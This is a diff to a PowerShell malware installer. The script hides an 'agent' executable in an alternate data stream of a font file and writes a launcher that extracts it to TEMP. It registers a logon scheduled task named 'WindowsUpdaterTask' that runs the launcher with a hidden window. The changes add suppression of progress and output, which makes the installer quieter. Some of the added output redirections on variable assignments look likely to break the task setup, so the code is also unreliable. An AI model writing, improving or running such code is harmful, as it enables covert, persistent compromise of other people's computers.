@@ -32,15 +32,16 @@ $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
 $hiddenPath = "$fontFile`:$streamName"
 
-# --- 3. Create launcher script (run.ps1) with cleanup ---
+# --- 3. Create launcher script (run.ps1) with cleanup and progress suppression ---
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
+`$ProgressPreference = 'SilentlyContinue'
 `$fontFile = '$fontFile'
 `$streamName = '$streamName'
 `$tempAgent = "`$env:TEMP\agent.exe"
 
 # Delete old temp file if it exists
-if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force }
+if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
 
 # Extract agent from ADS
 `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
@@ -57,30 +58,31 @@ Write-Output "[+] Created launcher with cleanup: $launcherPath"
 $taskName = "WindowsUpdaterTask"
 
 try {
-    $taskService = New-Object -ComObject Schedule.Service
-    $taskService.Connect()
-    $rootFolder = $taskService.GetFolder("\")
+    # Suppress ALL output from COM operations with *>$null
+    $taskService = New-Object -ComObject Schedule.Service *>$null
+    $taskService.Connect() *>$null
+    $rootFolder = $taskService.GetFolder("\") *>$null
 
     # Delete existing task if any
-    try { $rootFolder.DeleteTask($taskName, 0) } catch { }
+    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }
 
     # Create a new task definition
-    $taskDefinition = $taskService.NewTask(0)
+    $taskDefinition = $taskService.NewTask(0) *>$null
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
     $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN
 
     # Add logon trigger
-    $trigger = $taskDefinition.Triggers.Create(9)   # TASK_TRIGGER_LOGON
+    $trigger = $taskDefinition.Triggers.Create(9) *>$null
     $trigger.UserId = $env:USERNAME
 
     # Add action – run the launcher script
-    $action = $taskDefinition.Actions.Create(0)   # TASK_ACTION_EXEC
+    $action = $taskDefinition.Actions.Create(0) *>$null
     $action.Path = "powershell.exe"
     $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
 
     # Register the task (6 = UpdateOrCreate)
-    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
+    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) *>$null
     Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
 } catch {
     Write-Output "[-] Failed to create scheduled task: $_"
